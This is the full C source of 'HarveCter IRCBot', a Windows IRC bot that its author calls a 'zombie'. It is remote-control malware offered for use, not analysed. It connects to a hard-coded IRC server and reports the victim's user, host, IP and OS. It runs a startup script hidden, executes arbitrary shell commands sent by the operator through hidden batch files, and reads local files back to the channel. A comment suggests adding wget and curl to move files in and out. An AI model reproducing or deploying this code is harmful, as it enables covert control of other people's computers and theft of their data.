/*
HarveCter IRCBot 1.0b-RC1
This "313373" code by: Harvie 2oo7
Minimalistic Windows IRC Bot/Zombie/Whatever you want...

INFO:
Optimalized for Dev-Cpp
Compile as window app to make a daemon

Warning:
There is not so big security!!!
If you want to keep your zombies,
control them only by PM or at completely secure channel!!!
All passwords, that are starting with your password will be accepted!!!

COMMANDS:
Warning: all commands are case sensitive

!login [login]          //Bad login=logout
!chanpass               //Set mode +k

PRIVILEGED COMMANDS:
!SAY  [msg]             //Say msg
!CMD  [shell command]   //Execute command @ zombie
!head [file to send]    //Send few (maxlines_to_send) lines of file
!raw  [line to send]    //Sends raw line to server (you can OP yourself)
!info                   //Info about zombie
!time                   //Localtime @ zombie
!show                   //Show console window
!hide                   //Hide console window
!restart                //Restart connection
!respawn                //Restart whole zombie

Development comments:

*/

//PREPROC:////////////////////////////////////////////////////////////////
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <winsock.h>
#include <windows.h>
#pragma comment(lib,"ws2_32.a");

//SETTINGS:///////////////////////////////////////////////////////////////
    char server[] = "irc.2600.net"; //IRC Server
    int port = 6667; //Port of IRC Server
    char channel[] = "#hv"; //IRC Channel
    char pass[] = "test"; //Bot Password
    char chanpass[] = "lol"; //Channel Password
    char rcfile[] = "hircb.rc.bat"; //Run this file hidden at bot startup
    int maxlines_to_send = 3; //Number of max lines to send at one time
    #define DEBUG //Enables printing/loging
    #define ENABLE_EXEC //Compile !CMD
//MAGICS://///////////////////////////////////////////////////////////////
    #define CONNECT_CHECKER_SLEEP 20000
    #define CONNECT_FAIL_SLEEP 5000
    #define IRC_JOIN_SLEEP 2000
    #define IRC_RETRY_SLEEP 1000
    #define MAXCHARS 768 //Maximum lenght of IRC message (RFC - 6 * 128 = 768)
//MISC:///////////////////////////////////////////////////////////////////
    char version[] = "1.0b-RC1"; //Bot version
    char cmdfile[] = "zzzcommands.bat";
    char nick[128] = "Harvecter"; //Doesn't matter - Username of active user (via getenv()) will be used instead


//
//FUNCTIONS://///////////////////////////////////////////////////////////

//CUT String to 768 characters
void irc_cut_text(char *line) {
           *(line+MAXCHARS) = 0;
           *(line+MAXCHARS-1) = '\n';
     }

//Sends IRC message "msg" to "channel" over socket "s".       
int irc_sendmsg(int s, char *channel, char *msg) {
    int len, err;
    char snd[1024];
    irc_cut_text(&msg);
    sprintf(snd, ": PRIVMSG %s :%s\n", channel, msg);
    irc_cut_text(&snd);
    len = strlen(snd);
    err = send(s, snd, len, 0);
    #ifdef DEBUG
    printf("%s", snd); //Show
    #endif
    return err;
    }

//This is thread to check/ping irc connection on background
int irc_check_socket = -1;
int irc_check_last = 0;
int irc_check_thread() {
     unsigned char ping[] = "PING\n";
     int irc_check_time, len, err;
     while(irc_check_last <= 0) sleep(500);
     while(1) {
         sleep(CONNECT_CHECKER_SLEEP);
         #ifdef DEBUG
           puts("Checking connection...");
         #endif
         if(irc_check_socket >= 0) {
             #ifdef DEBUG
             puts("Pinging IRC Server...");
             #endif
             err = send(irc_check_socket, ping, strlen(ping), 0);
             sleep(1500);
             #ifdef DEBUG
             printf("Server latency: %d\n", time(0)-irc_check_last-1.5);
             #endif
             if(time(0)-irc_check_last > (CONNECT_CHECKER_SLEEP/1000)+10 || err == -1) {
                 #ifdef DEBUG
                 puts("Server not responding - disconnecting!\n\n");
                 #endif
                 closesocket(irc_check_socket);
                                      
             }
         }
     }
}

//MAIN_FUNCTION://////////////////////////////////////////////////////////
int main(int argc, char *argv[]) {   

//MORE SETTINGS://////////////////////////////////////////////////////////
    //AllocConsole(); //Show
    //FreeConsole(); //Hide... ;)
    //freopen("log.txt", "ab", stdout); //Log all outputs to file
//INITIALIZATIONS:////////////////////////////////////////////////////////
    #ifndef DEBUG
            fclose(stdout);
            fclose(stdin);
    #endif
    srand(time(0));
    int i;
    unsigned char lclhost[256], lclhostnm[256], hostmsg[1000], linebuf[600];
    char *user, *processor, *root, *logonsrvr, *os, rnd[10];
    //Load enviroment variables
    user = getenv("USERNAME");
    processor = getenv("PROCESSOR_IDENTIFIER");
    root = getenv("SystemRoot");
    logonsrvr = getenv("LOGONSERVER");
    os = getenv("OS");
    //Generate nick from username and random number
    sprintf(rnd, "%i", rand());
    sprintf(nick, "H-%s-%s", user, rnd);
    //time
    struct tm *localtime(const time_t *tod);
    struct tm *p_st_cas;
    time_t cas;
    //cmd
    FILE *cmdf;
    //Start connection checking thread:
            unsigned checker_thread_id;
            unsigned long checker_handle;
            checker_handle = _beginthreadex( NULL, 0, irc_check_thread, 0, 0, &checker_thread_id);
            if (checker_handle == 0) {
               #ifdef DEBUG
                 puts("Cannot create connection watching thread!");
               #endif
	           return(20);
            }
//////////////////////////////////////////////////////////////////////////
//CODE:///////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////

    //Delete cmdfile (Hell knows it's useful...)
    cmdf = fopen(cmdfile, "w");
    fprintf(cmdf, "del %s 2>nul\n", cmdfile);
    fclose(cmdf);  
    WinExec(cmdfile,SW_HIDE);
    
    //Print banner
    #ifdef DEBUG
    printf("HarveCter IRCBot v%s\nConnecting: %s@%s:%i as %s\n\n", version, channel, server, port, nick);
    #endif
    //Execute startup script
    WinExec(rcfile,SW_HIDE); //Run rcfile (hidden)
    
    //Declarations for WSA
    int s;
    SOCKADDR_IN sck;
    HOSTENT *host, *localhost;
    WSADATA wsadata;
    WSAStartup(MAKEWORD(1,1),&wsadata);
    
    //Set details for WSA
    while( (host=gethostbyname(server)) == NULL){ //Host
        #ifdef DEBUG
        printf("!Error server host not found\nwaiting 5s...\n");
        #endif
        sleep(CONNECT_FAIL_SLEEP);                                 
    }
    sck.sin_family = PF_INET;
    memcpy(&sck.sin_addr.s_addr, host->h_addr, host->h_length);
    sck.sin_port = htons(port); //Port
    
    //Info at localhost
    while ((localhost=gethostbyname("")) == NULL) {
        #ifdef DEBUG
        printf("!Error local host not found\nwaiting 5s...\n");
        #endif
        sleep(CONNECT_FAIL_SLEEP);  
        }
        sprintf(lclhostnm, "%s", localhost->h_name);
        sprintf(lclhost, "%s", inet_ntoa(*((struct in_addr *)localhost->h_addr)));
        sprintf(hostmsg, "USER: %s at HOST: %s ( IP: %s ) SERVER: %s - OS: %s (%s) - ARCH: %s - VERSION: %s\n", user, lclhostnm, lclhost, logonsrvr, os, root, processor, version);
        #ifdef DEBUG
        printf("%s\n", hostmsg);
        #endif
    
    //Initialization of strings used for IRC communication, etc...
    int len, err; //Lenght, Error
    char snd[1024], msg[1000], rcv[1024], passin[1000], *sub;
    
    //Infinite loop (bot can't stop)
    while(1) {
    irc_check_socket = -1; //disable connection checking
    
    //Create socket
    s=socket(AF_INET, SOCK_STREAM, 0);
    
    //Connect
    while( ( connect(s, (struct sockaddr *)&sck, sizeof(sck)) ) ) {
        #ifdef DEBUG
        printf("!Error while connecting\nwaiting 5s...\n");
        #endif
        sleep(CONNECT_FAIL_SLEEP);
        }
    irc_check_socket = s; //enable connection checking for socket s
    
    //IRC Server login
    sprintf(snd, "USER USER %s # # :%s\nNICK %s\nJOIN %s\n", nick, nick, nick);
    irc_cut_text(&snd);
    len = strlen(snd);
    err = send(s, snd, len, 0);

    //Join&Set channel password
    sprintf(snd, "JOIN %s %s\n", channel, chanpass); len = strlen(snd); err = send(s, snd, len, 0);
    sleep(IRC_RETRY_SLEEP);
    err = send(s, snd, len, 0);
    //mode #chan +k heslo
    sleep(IRC_JOIN_SLEEP);
    sprintf(snd, "MODE %s +n+s+k %s\n", channel, chanpass); len = strlen(snd); err = send(s, snd, len, 0);
    sleep(IRC_RETRY_SLEEP);
    err = send(s, snd, len, 0);
             
       
    //Send greetings
    sprintf(msg, "Hello ;), let my introduce myself... I am %s v%s", nick, version); //Zprava
    err = irc_sendmsg(s, channel, msg);
    sprintf(msg, "!chanpass"); //Request channell operator to set channell password (mode +n+k)
    err = irc_sendmsg(s, channel, msg);
    
    //Loop (while connection exists)
    err = 1;
    while(err && err != -1) {
             
             //JOIN
             sprintf(snd, "JOIN %s %s\n", channel, chanpass); len = strlen(snd); err = send(s, snd, len, 0);
             
             //RECIEVE
             memset(rcv, '\0', 1024);
             sub = 0;
             err = recv(s, rcv, 1020, 0);
             irc_cut_text(&rcv);
             #ifdef DEBUG
             printf("%s", rcv);
             #endif
             irc_check_last = time(0); //For connection checker
             
             //PING-PONG (Respond to server pings only)
             if ( (sub = (strstr(rcv, "PING :"))) ) {
                sub = sub+6;
                sprintf(snd, "PONG :%s", sub);
                irc_cut_text(&snd);
                len = strlen(snd);
                err = send(s, snd, len, 0);
                #ifdef DEBUG
                printf("%s", snd);
                #endif
                }
             sub = 0;
             
             if ( (sub = (strstr(rcv, ":!chanpass"))) ) {
                #ifdef DEBUG
                printf("!Setting chanpass\n");
                #endif
                sprintf(snd, "MODE %s +n+s+k %s\n", channel, chanpass);
                irc_cut_text(&snd);
                len = strlen(snd);
                err = send(s, snd, len, 0);
             }
             sub = 0;
             
             //LOGIN
             if ( (sub = (strstr(rcv, ":!login "))) ) {
                sub = sub+8;
                sprintf(passin, "%s", sub);
                if ( strstr(passin, pass) ) {  //Use this condition to check login.
                   sprintf(msg, "Login succesful");
                   err = irc_sendmsg(s, channel, msg);
                   #ifdef DEBUG
                   printf("\n!!!Login succesful\n");
                   #endif
                } else {
                   sprintf(msg, "Loged out");
                   err = irc_sendmsg(s, channel, msg);
                   #ifdef DEBUG
                   printf("!!!Loged out\n\n");
                   #endif
                }
             }
             sub = 0;
             
             //IF LOGED IN:
             if ( strstr(passin, pass) ) {
                  
               //SAY
               if ( (sub = (strstr(rcv, ":!SAY "))) ) {
                  sub = sub+6;
                  sprintf(msg, "MSG: %s", sub); //Zprava
                  err = irc_sendmsg(s, channel, msg);
                }
                sub = 0;
             
                //INFO (USER, DOMAIN, IP, ARCHITECTURE)
                if ( (sub = (strstr(rcv, ":!info"))) ) {
                   err = irc_sendmsg(s, channel, hostmsg);
                }
                sub = 0;
                
                //TIME
                if ( (sub = (strstr(rcv, ":!time"))) ) {
                   #ifdef DEBUG
	               printf("Time\n");
	               #endif

	               cas = time(0);
                   p_st_cas = localtime(&cas);
	               
                   strftime(msg, 512, "%H:%M:%S (%p) - %d(%A) %m(%B) %Y - %Z", p_st_cas);
                   err = irc_sendmsg(s, channel, msg);
                }
                sub = 0;
                
                //SEND RAW
               if ( (sub = (strstr(rcv, ":!raw "))) ) {
                  sub = sub+6;
                  irc_cut_text(&sub);
                  len = strlen(sub);
                  err = send(s, sub, len, 0);
                }
                sub = 0;
             
                #ifdef ENABLE_EXEC
                //SHELL
                //Hey! Don't forget to download wget&curl in bot directory!! ;D
                //With wget and curl you will be able to download and upload files...
                if ( (sub = (strstr(rcv, ":!CMD "))) ) {
                   sub = sub+6;
                   #ifdef DEBUG
                   printf("!CMD %s", sub);
                   #endif
                
                   sprintf(msg, "Executing: %s", sub);
                   irc_sendmsg(s, channel, msg);
                   #ifdef DEBUG
                   printf("!!! %s", msg);
                   #endif
                   
                   FILE *cmdf = fopen(cmdfile, "w");
                   fprintf(cmdf, "%s\ndel %s\n", sub, cmdfile);
	               fclose(cmdf);
                   
                   WinExec(cmdfile,SW_HIDE); //Hide console window
                   //system(cmdfile); //Show console window
                }
                sub = 0;
                #endif
                
                //SEND LINE OF FILE
                if ( (sub = (strstr(rcv, ":!head "))) ) {
                   sub = sub+7;
                   #ifdef DEBUG
                   printf("!head %s", sub);
                   #endif
                   
                   for(i=0;i<strlen(sub);i++) {
                         if(sub[i]=='\n' || sub[i]=='\r') sub[i]=0;
                         
                   }
                   
                   if((cmdf = fopen(sub, "r")) != NULL) {
                     for(i=0;i<maxlines_to_send;i++) {
                       fgets(linebuf, (600-1), cmdf);
                       sprintf(msg, "%s: %s\n", sub, linebuf);
                       irc_sendmsg(s, channel, msg);
                       #ifdef DEBUG
                       printf("-> %s", msg);
                       #endif
                     }
                     
                     fclose(cmdf);
                   }
                }
                
                //HIDE/SHOW
                if ( (sub = (strstr(rcv, ":!hide"))) ) { FreeConsole(); } sub = 0;
                if ( (sub = (strstr(rcv, ":!show"))) ) { AllocConsole(); } sub = 0;
                
                //RESTART connection to server
                if ( (sub = (strstr(rcv, ":!restart"))) ) {
                     sprintf(msg, "Please wait while restarting...");
                     err = irc_sendmsg(s, channel, msg);
                     closesocket(s);
                     sprintf(msg, "ERROR: Couldn't close socket :(");
                     err = irc_sendmsg(s, channel, msg);
                     #ifdef DEBUG
                     printf("\nRESTARTING...\n\n");
                     #endif
                }
                sub = 0;
                
                //RESPAWN (restarts all)
                if ( (sub = (strstr(rcv, ":!respawn"))) ) {
                     sprintf(msg, "Please wait while respawning...");
                     err = irc_sendmsg(s, channel, msg);
                     #ifdef DEBUG
                     printf("\nRESPAWNING...\n\n");
                     #endif
                     closesocket(s);
                     execl(argv[0], NULL); //Exchange old process for new (argv[0])
                     sprintf(msg, "ERROR: Couldn't respawn :(");
                     err = irc_sendmsg(s, channel, msg);
                     #ifdef DEBUG
                     printf("ERROR: Couldn't respawn :(\n");
                     #endif
                }
                sub = 0;
                
             }//END LOCKED COMMANDS
    }//LoopEND
    
    //Close
    closesocket(s);
    #ifdef DEBUG
    printf("!Error while sending\nwaiting 5s before reconnect...\n");
    #endif
    sleep(CONNECT_FAIL_SLEEP);
    }//InfiniteLoopEND
        
    //Finito (never reach here)
    closesocket(s);
    WSACleanup(); //Flush WSA    
    return(0);
    
}
